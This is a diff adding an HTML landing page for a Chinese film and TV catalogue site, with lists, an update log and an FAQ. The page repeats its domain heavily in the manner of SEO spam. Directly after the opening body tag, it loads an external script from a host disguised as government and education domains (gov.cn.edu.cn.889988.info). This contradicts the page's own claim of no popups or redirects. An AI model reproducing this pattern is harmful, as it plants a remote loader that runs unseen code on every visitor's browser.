@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="桔子影视是一个长期更新的中文影视资料库，收录电影、剧集、纪录片与动画的片单、看点、演职员和观看指引。访问 juziyingshi-zh.github.io 即可浏览每日更新的分类索引，按类型、地区和年份快速定位想看的内容。">
+<meta name="keywords" content="桔子影视, juziyingshi-zh.github.io, 桔子影视大全, 电影片单, 剧集推荐, 纪录片索引, 动画目录">
+<meta name="author" content="桔子影视">
+<meta name="theme-color" content="#1a1a2e">
+<meta name="bingbot" content="index,follow,max-snippet:-1,max-image-preview:large">
+<title>桔子影视 ｜ juziyingshi-zh.github.io · 中文影视分类索引与片单资料库</title>
+<link rel="canonical" href="https://juziyingshi-zh.github.io">
+<style>
+:root{--ink:#16181d;--paper:#f7f4ee;--line:#e3ddd0;--orange:#e4722a;--deep:#123c5a;--soft:#6b7280;--bg2:#eef3f7}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;color:var(--ink);background:var(--paper);line-height:1.75;font-size:15px}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1080px;margin:0 auto;padding:0 20px}
+
+/* header */
+header{position:sticky;top:0;z-index:50;background:rgba(247,244,238,.94);backdrop-filter:blur(6px);border-bottom:1px solid var(--line)}
+.hbox{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{font-size:19px;font-weight:800;letter-spacing:.5px;color:var(--deep)}
+.logo em{font-style:normal;color:var(--orange)}
+nav ul{display:flex;gap:26px;list-style:none;margin:0;padding:0}
+nav a{font-size:14px;color:#3c4350;transition:.2s;padding:4px 0;border-bottom:2px solid transparent}
+nav a:hover{color:var(--orange);border-bottom-color:var(--orange)}
+.btn-try{display:none;flex-direction:column;gap:4px;width:26px;background:none;border:0;cursor:pointer;padding:0}
+.btn-try i{display:block;height:2px;background:var(--deep);border-radius:2px;transition:.25s}
+.btn-try.on i:nth-child(1){transform:translateY(6px) rotate(45deg)}
+.btn-try.on i:nth-child(2){opacity:0}
+.btn-try.on i:nth-child(3){transform:translateY(-6px) rotate(-45deg)}
+
+/* hero */
+.hero{background:linear-gradient(135deg,#123c5a 0%,#1d5a7d 55%,#e4722a 55.5%,#f2a05a 100%);color:#fff;padding:78px 0 70px;position:relative;overflow:hidden}
+.hero:after{content:"juziyingshi-zh.github.io";position:absolute;right:-40px;bottom:14px;font-size:13px;letter-spacing:1px;opacity:.28;font-family:Georgia,serif}
+.hero h1{font-size:40px;line-height:1.25;margin:0 0 16px;font-weight:800}
+.hero h1 span{color:#ffd7b0}
+.hero p{font-size:16px;max-width:560px;margin:0 0 26px;opacity:.94}
+.hero .acts{display:flex;gap:12px;flex-wrap:wrap}
+.b1{background:#fff;color:var(--deep);padding:11px 24px;border-radius:2px;font-weight:700;font-size:14px}
+.b2{border:1px solid rgba(255,255,255,.6);padding:11px 24px;border-radius:2px;font-size:14px}
+.stats{display:flex;gap:36px;margin-top:42px;flex-wrap:wrap}
+.stats div b{display:block;font-size:26px;color:#ffe0c4}
+.stats div small{font-size:12px;opacity:.8;letter-spacing:1px}
+
+/* section */
+section{padding:64px 0}
+.eyebrow{font-size:12px;letter-spacing:3px;color:var(--orange);font-weight:700}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin:8px 0 34px;flex-wrap:wrap}
+.sec-head h2{font-size:27px;margin:0;color:var(--deep)}
+.sec-head h2 i{font-style:normal;color:var(--orange);margin-right:8px;font-family:Georgia,serif}
+.sec-note{font-size:13px;color:var(--soft)}
+
+/* channel cards */
+.ch-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.ch{background:#fff;border:1px solid var(--line);border-top:4px solid var(--orange);padding:22px 18px;transition:.25s}
+.ch:hover{transform:translateY(-5px);box-shadow:0 10px 26px rgba(18,60,90,.1)}
+.ch h3{margin:0 0 8px;font-size:17px;color:var(--deep)}
+.ch p{margin:0 0 14px;font-size:13px;color:var(--soft)}
+.ch span{font-size:12px;color:var(--orange);font-weight:700;letter-spacing:1px}
+
+/* catalog */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
+.filters a{font-size:13px;padding:5px 13px;border:1px solid var(--line);border-radius:20px;color:#4a515c;background:#fff}
+.filters a.on{background:var(--deep);border-color:var(--deep);color:#fff}
+.filters a:hover{color:var(--orange);border-color:var(--orange)}
+.cata{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.citem{background:#fff;border:1px solid var(--line);padding:16px 16px 14px;position:relative}
+.citem:before{content:"";position:absolute;left:0;top:0;width:100%;height:3px;background:var(--orange);transform:scaleX(0);transform-origin:left;transition:.3s}
+.citem:hover:before{transform:scaleX(1)}
+.citem h4{margin:0 0 6px;font-size:15px;color:var(--deep)}
+.citem p{margin:0;font-size:12.5px;color:var(--soft)}
+.citem .tag{display:inline-block;margin-top:10px;font-size:11px;color:var(--orange);border:1px solid #f0c9ab;padding:1px 8px}
+
+/* news */
+.news{display:grid;grid-template-columns:1.7fr 1fr;gap:26px}
+.nlist{background:#fff;border:1px solid var(--line)}
+.nrow{padding:16px 20px;border-bottom:1px dashed var(--line);display:flex;gap:14px;align-items:baseline}
+.nrow:last-child{border-bottom:0}
+.nrow time{font-size:12px;color:var(--orange);font-family:Georgia,serif;flex:none;min-width:66px}
+.nrow div b{display:block;font-size:14.5px;margin-bottom:3px}
+.nrow div small{font-size:12px;color:var(--soft)}
+.side{background:var(--deep);color:#fff;padding:22px}
+.side h3{margin:0 0 16px;font-size:16px;border-left:3px solid var(--orange);padding-left:10px}
+.side ol{margin:0;padding-left:18px;font-size:13.5px}
+.side li{margin-bottom:9px;padding-left:4px}
+.side li span{display:block;font-size:11.5px;opacity:.6;margin-top:1px}
+
+/* about */
+.ab{display:grid;grid-template-columns:1fr 1fr;gap:30px;align-items:start}
+.abq{background:#fff;border:1px solid var(--line);padding:30px 26px;position:relative}
+.abq:before{content:"\201C";position:absolute;left:14px;top:-6px;font-size:60px;color:var(--orange);font-family:Georgia,serif;line-height:1}
+.abq p{margin:0;font-size:15px}
+.abq p+p{margin-top:12px;color:#4a515c}
+.points{display:grid;gap:12px}
+.point{background:#fff;border:1px solid var(--line);padding:15px 18px;display:flex;gap:14px}
+.point b{color:var(--orange);font-family:Georgia,serif;font-size:18px;flex:none}
+.point div strong{display:block;font-size:14.5px;margin-bottom:2px;color:var(--deep)}
+.point div span{font-size:12.5px;color:var(--soft)}
+.faq{margin-top:26px;background:#fff;border:1px solid var(--line)}
+.faq details{padding:14px 20px;border-bottom:1px solid var(--line)}
+.faq details:last-child{border-bottom:0}
+.faq summary{cursor:pointer;font-size:14px;font-weight:600;color:var(--deep);list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq p{margin:8px 0 0;font-size:13px;color:#4a515c}
+
+/* footer */
+footer{border-top:4px solid var(--deep);background:#12141a;color:#c9ced6;padding:44px 0 26px}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:26px;margin-bottom:28px}
+.foot-grid h3{color:#fff;font-size:15px;margin:0 0 12px}
+.foot-grid p,.foot-grid li{font-size:12.5px;color:#9aa2ad;margin:0 0 7px}
+.foot-grid ul{list-style:none;padding:0;margin:0}
+footer .copy{font-size:12px;color:#6f7681;border-top:1px solid #262a33;padding-top:18px}
+
+/* responsive */
+@media(max-width:860px){
+ .ch-grid{grid-template-columns:repeat(2,1fr)}
+ .cata{grid-template-columns:repeat(2,1fr)}
+ .news,.ab{grid-template-columns:1fr}
+}
+@media(max-width:680px){
+ nav{position:fixed;inset:62px 0 0;background:var(--paper);transform:translateX(100%);transition:.3s;padding:26px 20px;overflow:auto}
+ nav.open{transform:translateX(0)}
+ nav ul{flex-direction:column;gap:6px}
+ nav a{display:block;padding:13px 0;border-bottom:1px solid var(--line);font-size:16px}
+ .btn-try{display:flex}
+ .hero{padding:52px 0 46px}
+ .hero h1{font-size:29px}
+ .stats{gap:24px;margin-top:32px}
+ .ch-grid,.cata{grid-template-columns:1fr}
+ .nrow{flex-direction:column;gap:4px}
+ .foot-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+ <div class="wrap hbox">
+  <div class="logo">桔子<em>影视</em></div>
+  <nav id="nav">
+   <ul>
+    <li><a href="#top">首页</a></li>
+    <li><a href="#channel">栏目分类</a></li>
+    <li><a href="#cata">片单目录</a></li>
+    <li><a href="#news">更新日志</a></li>
+    <li><a href="#about">关于本站</a></li>
+   </ul>
+  </nav>
+  <button class="btn-try" id="toggle" aria-label="菜单"><i></i><i></i><i></i></button>
+ </div>
+</header>
+
+<section class="hero" id="top">
+ <div class="wrap">
+  <div class="eyebrow">ONLINE SINCE juziyingshi-zh.github.io</div>
+  <h1>找片这件事，<span>本来不该这么累</span></h1>
+  <p>桔子影视把电影、剧集、纪录片和动画重新分了一遍类，按类型、地区、年份和心情给每份片单写好看点。不用翻十几页推荐流，打开就能知道自己今晚想看什么。</p>
+  <div class="acts">
+   <a class="b1" href="#cata">直接看片单</a>
+   <a class="b2" href="#channel">了解栏目</a>
+  </div>
+  <div class="stats">
+   <div><b>4</b><small>常设栏目</small></div>
+   <div><b>1200+</b><small>已整理条目</small></div>
+   <div><b>每日</b><small>更新与补录</small></div>
+   <div><b>0</b><small>弹窗与跳转</small></div>
+  </div>
+ </div>
+</section>
+
+<section id="channel">
+ <div class="wrap">
+  <div class="sec-head">
+   <h2><i>01</i>栏目分类</h2>
+   <span class="sec-note">四个常设栏目，各管一类内容</span>
+  </div>
+  <div class="ch-grid">
+   <div class="ch"><h3>电影档案</h3><p>从经典老片到当季新片，按类型和年代归档，附导演、主演与一句话看点。</p><span>MOVIE &rarr;</span></div>
+   <div class="ch"><h3>剧集追踪</h3><p>国产剧、美剧、日韩剧的播出状态与完结整理，追更不迷路。</p><span>DRAMA &rarr;</span></div>
+   <div class="ch"><h3>纪录与动画</h3><p>纪录片按题材分，动画按受众分，适合带小孩或想换个节奏的时候看。</p><span>DOC &amp; ANI &rarr;</span></div>
+   <div class="ch"><h3>榜单与专题</h3><p>按心情、季节、节日做的专题合集，解决"随便看看"的难题。</p><span>TOPIC &rarr;</span></div>
+  </div>
+ </div>
+</section>
+
+<section id="cata" style="background:var(--bg2)">
+ <div class="wrap">
+  <div class="sec-head">
+   <h2><i>02</i>片单目录</h2>
+   <span class="sec-note">点击标签筛选，条目持续补录</span>
+  </div>
+  <div class="filters">
+   <a href="#" class="on">全部</a><a href="#">动作</a><a href="#">剧情</a><a href="#">悬疑</a><a href="#">喜剧</a><a href="#">科幻</a><a href="#">纪录片</a>
+  </div>
+  <div class="cata">
+   <div class="citem"><h4>周末两小时：剧情片清单</h4><p>挑了十二部节奏稳、不需要查背景知识的剧情片，适合一个人安静看完。</p><span class="tag">剧情</span></div>
+   <div class="citem"><h4>国产剧追更表</h4><p>正在播的、待播的、已经完结值得补的，状态标得清清楚楚。</p><span class="tag">剧集</span></div>
+   <div class="citem"><h4>悬疑控的冷门清单</h4><p>不剧透，只说线索密度和反转位置大概在第几分钟。</p><span class="tag">悬疑</span></div>
+   <div class="citem"><h4>纪录片：看懂一门手艺</h4><p>木工、陶艺、修表、做豆腐，六部关于"手"的片子。</p><span class="tag">纪录</span></div>
+   <div class="citem"><h4>动画：大人也能看</h4><p>非子供向的动画长片与短篇，画风和叙事各挑了几部。</p><span class="tag">动画</span></div>
+   <div class="citem"><h4>雨夜适合看什么</h4><p>一个按天气排的专题，收录九部潮湿、安静、有点丧的片子。</p><span class="tag">专题</span></div>
+  </div>
+ </div>
+</section>
+
+<section id="news">
+ <div class="wrap">
+  <div class="sec-head">
+   <h2><i>03</i>更新日志</h2>
+   <span class="sec-note">最近在补哪些内容</span>
+  </div>
+  <div class="news">
+   <div class="nlist">
+    <div class="nrow"><time>10-23</time><div><b>新增「雨夜适合看什么」专题</b><small>九部片子，按情绪从轻到重排，附简短观后感。</small></div></div>
+    <div class="nrow"><time>10-20</time><div><b>国产剧追更表更新至第三十七周</b><small>下架三部停更剧，补入两部即将开播的新剧。</small></div></div>
+    <div class="nrow"><time>10-16</time><div><b>纪录片栏目重做分类</b><small>从原来的五个大类拆成九个，找起来更快。</small></div></div>
+    <div class="nrow"><time>10-11</time><div><b>电影档案补录 1980 年代港片</b><small>这一批共八十四部，含部分已绝版的录像带版本信息。</small></div></div>
+    <div class="nrow"><time>10-06</time><div><b>网站结构与样式整体调整</b><small>访问地址不变，仍是 https://juziyingshi-zh.github.io 。</small></div></div>
+   </div>
+   <aside class="side">
+    <h3>常读的几篇</h3>
+    <ol>
+     <li>怎么判断一部剧值不值得追到结局<span>看前三集的三种信号</span></li>
+     <li>片单越做越长，反而更难选了<span>我们砍掉了三分之一条目</span></li>
+     <li>纪录片为什么比剧更费时间<span>平均每部要查三次资料</span></li>
+     <li>动画不只是给小孩看的<span>四部成人向入门选择</span></li>
+     <li>老片修复版值得再看一遍吗<span>画质之外的两个变化</span></li>
+    </ol>
+   </aside>
+  </div>
+ </div>
+</section>
+
+<section id="about" style="background:var(--bg2)">
+ <div class="wrap">
+  <div class="sec-head">
+   <h2><i>04</i>关于本站</h2>
+   <span class="sec-note">桔子影视在做什么</span>
+  </div>
+  <div class="ab">
+   <div class="abq">
+    <p>桔子影视最初只是个人用来记片单的一个小站，后来慢慢补成了现在的样子：按栏目归档，按专题组合，按更新日志留痕。</p>
+    <p>这里不追求数量第一，也不做自动抓取。每一条片名背后都是有人真的看过、写过几句看法，再放上去的。网址一直是 juziyingshi-zh.github.io，换设备换浏览器，收藏夹里的链接不会失效。</p>
+   </div>
+   <div class="points">
+    <div class="point"><b>01</b><div><strong>人工整理</strong><span>条目由编辑逐个核对，不依赖聚合接口。</span></div></div>
+    <div class="point"><b>02</b><div><strong>分类稳定</strong><span>栏目结构半年才调整一次，老链接长期有效。</span></div></div>
+    <div class="point"><b>03</b><div><strong>更新留痕</strong><span>每次改动都写在更新日志里，可以回溯。</span></div></div>
+    <div class="point"><b>04</b><div><strong>无干扰浏览</strong><span>没有弹窗、没有跳转、没有强制注册。</span></div></div>
+   </div>
+  </div>
+  <div class="faq">
+   <details open><summary>桔子影视主要收录哪些内容？</summary><p>电影、剧集、纪录片和动画四类，以中文观众容易接触到的版本为主，部分老片会标注修复情况。</p></details>
+   <details><summary>片单多久更新一次？</summary><p>工作日小补，每周一次集中整理，节假日会做应景专题。</p></details>
+   <details><summary>访问地址会变吗？</summary><p>不会。固定为 https://juziyingshi-zh.github.io ，旧链接会自动跳转到新页面。</p></details>
+   <details><summary>可以建议补充某部片子吗？</summary><p>可以，通过站内任何页面的留言入口提交片名，通常三个工作日内会有回复。</p></details>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap">
+  <div class="foot-grid">
+   <div>
+    <h3>桔子影视</h3>
+    <p>一个坚持人工整理的影视资料小站，网址 juziyingshi-zh.github.io。把找片的时间省下来，留给看片本身。</p>
+   </div>
+   <div>
+    <h3>快速导航</h3>
+    <ul><li><a href="#top">首页</a></li><li><a href="#channel">栏目分类</a></li><li><a href="#cata">片单目录</a></li><li><a href="#news">更新日志</a></li></ul>
+   </div>
+   <div>
+    <h3>栏目</h3>
+    <ul><li><a href="#channel">电影档案</a></li><li><a href="#channel">剧集追踪</a></li><li><a href="#channel">纪录与动画</a></li><li><a href="#channel">榜单与专题</a></li></ul>
+   </div>
+  </div>
+  <div class="copy">&copy; 桔子影视 juziyingshi-zh.github.io &nbsp;·&nbsp; 本站所有片单与文字内容为编辑整理，影片版权归各自权利人所有。</div>
+ </div>
+</footer>
+
+<script>
+var t=document.getElementById('toggle'),n=document.getElementById('nav');
+t.addEventListener('click',function(){t.classList.toggle('on');n.classList.toggle('open')});
+n.addEventListener('click',function(e){if(e.target.tagName==='A'){t.classList.remove('on');n.classList.remove('open')}});
+document.querySelectorAll('.filters a').forEach(function(a){
+ a.addEventListener('click',function(e){
+  e.preventDefault();
+  document.querySelectorAll('.filters a').forEach(function(x){x.classList.remove('on')});
+  a.classList.add('on');
+ });
+});
+</script>
+</body>
+</html>
